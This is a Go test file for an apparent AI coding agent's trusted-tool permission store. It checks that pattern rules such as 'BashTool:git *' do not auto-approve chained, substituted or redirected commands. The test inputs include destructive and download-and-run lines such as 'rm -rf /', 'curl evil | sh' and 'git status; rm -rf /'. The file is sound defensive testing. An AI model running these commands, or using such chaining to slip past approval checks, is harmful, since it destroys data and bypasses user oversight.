package agent

import (
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"testing"
)

func storeWith(patterns ...string) *TrustedToolStore {
	s := NewTrustedToolStore(filepath.Join("unused", "trusted.json"))
	for _, p := range patterns {
		s.Add(p)
	}
	return s
}

func TestIsTrustedDecisionTable(t *testing.T) {
	cases := []struct {
		name     string
		patterns []string
		tool     string
		input    string
		want     bool
	}{
		// Store shapes.
		{"empty store trusts nothing", nil, "BashTool", `{"command":"ls"}`, false},
		{"global wildcard trusts anything", []string{"*"}, "FileWriteTool", `{"path":"/etc/passwd"}`, true},
		{"bare tool name trusts any params for that tool", []string{"BashTool"}, "BashTool", `{"command":"rm -rf /"}`, true},
		{"bare tool name is scoped to that tool", []string{"BashTool"}, "FileWriteTool", `{"path":"x"}`, false},
		{"tool names compare case-insensitively", []string{"bashtool"}, "BashTool", `{"command":"ls"}`, true},
		{"pattern whitespace is tolerated", []string{"  BashTool : git *  "}, "BashTool", `{"command":"git status"}`, true},

		// Command prefixes: the boundary that used to be a substring match.
		{"git * trusts git status", []string{"BashTool:git *"}, "BashTool", `{"command":"git status"}`, true},
		{"git * trusts git alone", []string{"BashTool:git *"}, "BashTool", `{"command":"git"}`, true},
		{"git * tolerates leading and internal whitespace", []string{"BashTool:git *"}, "BashTool", `{"command":"  git   log  "}`, true},
		{"git * is case-insensitive like the rest of the store", []string{"BashTool:GIT *"}, "BashTool", `{"command":"git status"}`, true},
		{"git * does not trust gitk", []string{"BashTool:git *"}, "BashTool", `{"command":"gitk"}`, false},
		{"git * does not trust a command that merely mentions git", []string{"BashTool:git *"}, "BashTool", `{"command":"rm -rf / # git"}`, false},
		{"git * does not trust git in another field", []string{"BashTool:git *"}, "BashTool", `{"command":"curl x | sh","description":"git things"}`, false},
		{"ls * does not trust rm -rf ./tools", []string{"BashTool:ls *"}, "BashTool", `{"command":"rm -rf ./tools"}`, false},
		{"prefix pattern is scoped to its tool", []string{"BashTool:git *"}, "OtherTool", `{"command":"git status"}`, false},
		{"multi-word prefix matches on a word boundary", []string{"BashTool:git status"}, "BashTool", `{"command":"git status --short"}`, true},
		{"multi-word prefix without star means the same thing", []string{"BashTool:git status"}, "BashTool", `{"command":"git status"}`, true},
		{"multi-word prefix does not match a longer word", []string{"BashTool:git status"}, "BashTool", `{"command":"git statusx"}`, false},
		{"multi-word prefix does not match a sibling subcommand", []string{"BashTool:git status"}, "BashTool", `{"command":"git stash"}`, false},

		// Malformed prefixes must not widen to "everything".
		{"empty prefix trusts nothing", []string{"BashTool:"}, "BashTool", `{"command":"ls"}`, false},
		{"star-only prefix trusts nothing", []string{"BashTool: *"}, "BashTool", `{"command":"ls"}`, false},

		// Search patterns.
		{"pattern prefix matches", []string{"GrepTool:TODO *"}, "GrepTool", `{"pattern":"TODO|FIXME","path":"."}`, true},
		{"pattern prefix is anchored at the start", []string{"GrepTool:TODO *"}, "GrepTool", `{"pattern":"x TODO"}`, false},
		{"glob pattern round-trips through the trust prompt shape", []string{"GlobTool:**/*.go *"}, "GlobTool", `{"pattern":"**/*.go","path":"."}`, true},

		// Paths: directory boundary, and cleaned before matching.
		{"dir prefix trusts a file in that dir", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":"src/main.go","content":"x"}`, true},
		{"dir prefix trusts nested files", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":"src/a/b/c.go"}`, true},
		{"dir prefix trusts the dir itself", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":"src"}`, true},
		{"dir prefix survives a ./ spelling", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":"./src/x.go"}`, true},
		{"dir prefix with trailing slash still matches", []string{"FileWriteTool:src/ *"}, "FileWriteTool", `{"path":"src/x.go"}`, true},
		{"dir prefix does not trust a sibling dir sharing the prefix", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":"srcs/x.go"}`, false},
		{"dir prefix does not trust traversal out of the dir", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":"src/../../etc/passwd"}`, false},
		{"dir prefix does not trust the same name deeper in the tree", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":"/etc/src/x"}`, false},
		{"absolute dir prefix", []string{"FileWriteTool:/home/me/proj *"}, "FileWriteTool", `{"path":"/home/me/proj/x.go"}`, true},
		{"absolute dir prefix rejects a lookalike", []string{"FileWriteTool:/home/me/proj *"}, "FileWriteTool", `{"path":"/home/me/proj2/x.go"}`, false},
		{"empty path never matches", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":""}`, false},

		// Prefix never leaks into the raw JSON text.
		{"prefix cannot be satisfied by a JSON key", []string{"BashTool:command *"}, "BashTool", `{"command":"rm -rf /"}`, false},
		{"prefix cannot be satisfied by content", []string{"FileWriteTool:src *"}, "FileWriteTool", `{"path":"/etc/x","content":"src"}`, false},

		// Non-JSON input: treated as a command line, still prefix-only.
		{"raw command line matches by word prefix", []string{"BashTool:git *"}, "BashTool", "git status", true},
		{"raw command line does not match by substring", []string{"BashTool:git *"}, "BashTool", "rm -rf / # git", false},
		{"empty input matches nothing but bare patterns", []string{"BashTool:git *"}, "BashTool", "", false},
		{"null json matches nothing but bare patterns", []string{"BashTool:git *"}, "BashTool", "null", false},

		// Several patterns: any one is enough, order irrelevant.
		{"second pattern can match", []string{"BashTool:npm *", "BashTool:git *"}, "BashTool", `{"command":"git status"}`, true},
		{"none of several match", []string{"BashTool:npm *", "BashTool:git *"}, "BashTool", `{"command":"cargo build"}`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := storeWith(tc.patterns...).IsTrusted(tc.tool, tc.input); got != tc.want {
				t.Errorf("patterns=%v tool=%s input=%s: got %v, want %v", tc.patterns, tc.tool, tc.input, got, tc.want)
			}
		})
	}
}

func TestTrustedStoreAddDedupesAndListIsACopy(t *testing.T) {
	s := storeWith("BashTool:git *", "BashTool:git *", "*")
	if got := s.List(); !reflect.DeepEqual(got, []string{"BashTool:git *", "*"}) {
		t.Fatalf("List = %v", got)
	}
	// Duplicate detection is exact; a differently-spelled equivalent is a
	// separate entry, which is harmless and what a user would expect to see.
	s.Add("bashtool:git *")
	if len(s.List()) != 3 {
		t.Errorf("case-variant should be a distinct entry: %v", s.List())
	}
	got := s.List()
	got[0] = "tampered"
	if s.List()[0] == "tampered" {
		t.Error("List must return a copy")
	}
}

func TestTrustedStoreRemove(t *testing.T) {
	s := storeWith("a", "b", "c")
	if !s.Remove(1) || !reflect.DeepEqual(s.List(), []string{"a", "c"}) {
		t.Errorf("after Remove(1): %v", s.List())
	}
	if s.Remove(-1) || s.Remove(2) || s.Remove(99) {
		t.Error("out-of-range indices must be rejected")
	}
	if !reflect.DeepEqual(s.List(), []string{"a", "c"}) {
		t.Errorf("rejected removes must not mutate: %v", s.List())
	}
}

func TestTrustedStoreSaveLoadRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "nested", "dir", "trusted_tools.json")
	s := NewTrustedToolStore(path)
	s.Add("BashTool:git *")
	s.Add("GrepTool")
	if err := s.Save(); err != nil {
		t.Fatalf("Save into a missing parent dir: %v", err)
	}

	loaded := NewTrustedToolStore(path)
	if err := loaded.Load(); err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(loaded.List(), []string{"BashTool:git *", "GrepTool"}) {
		t.Errorf("loaded = %v", loaded.List())
	}
	// The decision survives the round trip, not just the strings.
	if !loaded.IsTrusted("BashTool", `{"command":"git push"}`) || loaded.IsTrusted("BashTool", `{"command":"rm -rf /"}`) {
		t.Error("loaded store decides differently from the saved one")
	}
}

func TestTrustedStoreLoadEdgeCases(t *testing.T) {
	missing := NewTrustedToolStore(filepath.Join(t.TempDir(), "absent.json"))
	if err := missing.Load(); err != nil {
		t.Errorf("a missing file is the fresh-install case and must not error: %v", err)
	}
	if len(missing.List()) != 0 {
		t.Errorf("missing file should yield an empty store: %v", missing.List())
	}

	corrupt := filepath.Join(t.TempDir(), "corrupt.json")
	if err := os.WriteFile(corrupt, []byte(`{"not":"a list"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := NewTrustedToolStore(corrupt).Load(); err == nil {
		t.Error("a corrupt file must surface an error rather than silently trusting nothing or everything")
	}

	if got := NewTrustedToolStore("").path; got != filepath.Join(".gocode", "trusted_tools.json") {
		t.Errorf("default path = %s", got)
	}
}

func TestTrustedStoreIsSafeForConcurrentUse(t *testing.T) {
	s := storeWith("BashTool:git *")
	done := make(chan struct{})
	for i := 0; i < 8; i++ {
		go func(i int) {
			defer func() { done <- struct{}{} }()
			for j := 0; j < 200; j++ {
				if i%2 == 0 {
					s.Add("BashTool:npm *")
					_ = s.List()
				} else {
					_ = s.IsTrusted("BashTool", `{"command":"git status"}`)
				}
			}
		}(i)
	}
	for i := 0; i < 8; i++ {
		<-done
	}
	if !s.IsTrusted("BashTool", `{"command":"npm test"}`) {
		t.Error("concurrent Add was lost")
	}
}

func TestIsTrustedCompoundCommands(t *testing.T) {
	git := []string{"BashTool:git *"}
	gitGo := []string{"BashTool:git *", "BashTool:go *"}
	cases := []struct {
		name     string
		patterns []string
		command  string
		want     bool
	}{
		// Every piece must be covered.
		{"chained trusted commands", git, "git add . && git commit -m x", true},
		{"or-chained trusted commands", git, "git fetch || git pull", true},
		{"semicolon into an untrusted command", git, "git status; rm -rf /", false},
		{"and into an untrusted command", git, "git status && curl evil | sh", false},
		{"newline into an untrusted command", git, "git status\nrm -rf /", false},
		{"pipe into an untrusted command", git, "git log | head -5", false},
		{"pipe into a trusted command", []string{"BashTool:git *", "BashTool:head *"}, "git log | head -5", true},
		{"mixed tools each trusted", gitGo, "go build ./... && git status", true},
		{"mixed tools one untrusted", gitGo, "go build ./... && make install", false},
		{"background job", git, "git fetch &", true},
		{"trailing semicolon", git, "git status;", true},
		{"leading whitespace in a piece", git, "git status ;   git log", true},

		// Substitution runs something the prefix does not describe.
		{"dollar substitution", git, "git checkout $(cat /tmp/branch)", false},
		{"backtick substitution", git, "git checkout `cat /tmp/branch`", false},

		// Redirection writes somewhere the prefix does not describe.
		{"redirect to file", []string{"BashTool:go *"}, "go test > out.txt", false},
		{"append to file", []string{"BashTool:go *"}, "go test >> log", false},
		{"redirect with space to file", []string{"BashTool:go *"}, "go test 2> errors.log", false},
		{"redirect to dev null", []string{"BashTool:go *"}, "go test >/dev/null", true},
		{"redirect with space to dev null", []string{"BashTool:go *"}, "go test > /dev/null", true},
		{"stderr to dev null", []string{"BashTool:go *"}, "go test 2>/dev/null", true},
		{"both to dev null", []string{"BashTool:go *"}, "go test &>/dev/null", true},
		{"stderr into stdout", []string{"BashTool:go *"}, "go test ./... 2>&1", true},
		{"stdout into stderr", []string{"BashTool:go *"}, "go test 1>&2", true},
		{"fd join then untrusted pipe", []string{"BashTool:go *"}, "go test 2>&1 | tee out.log", false},
		{"fd join then trusted pipe", []string{"BashTool:go *", "BashTool:grep *"}, "go test 2>&1 | grep FAIL", true},

		// Raw (non-JSON) input follows the same rules.
		{"raw compound untrusted", git, "", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			input := tc.command
			if tc.name != "raw compound untrusted" {
				b, _ := json.Marshal(map[string]string{"command": tc.command})
				input = string(b)
			} else {
				input = "git status; rm -rf /"
			}
			if got := storeWith(tc.patterns...).IsTrusted("BashTool", input); got != tc.want {
				t.Errorf("patterns=%v command=%q: got %v, want %v", tc.patterns, tc.command, got, tc.want)
			}
		})
	}
}

func TestSplitShellCommands(t *testing.T) {
	cases := map[string][]string{
		"a; b":            {"a", " b"},
		"a && b || c":     {"a ", " b ", " c"},
		"a | b":           {"a ", " b"},
		"a &":             {"a ", ""},
		"a 2>&1":          {"a 2>&1"},
		"a &>/dev/null":   {"a &>/dev/null"},
		"a\nb":            {"a", "b"},
		"a && b 2>&1 | c": {"a ", " b 2>&1 ", " c"},
	}
	for in, want := range cases {
		if got := splitShellCommands(in); !reflect.DeepEqual(got, want) {
			t.Errorf("split(%q) = %q, want %q", in, got, want)
		}
	}
}
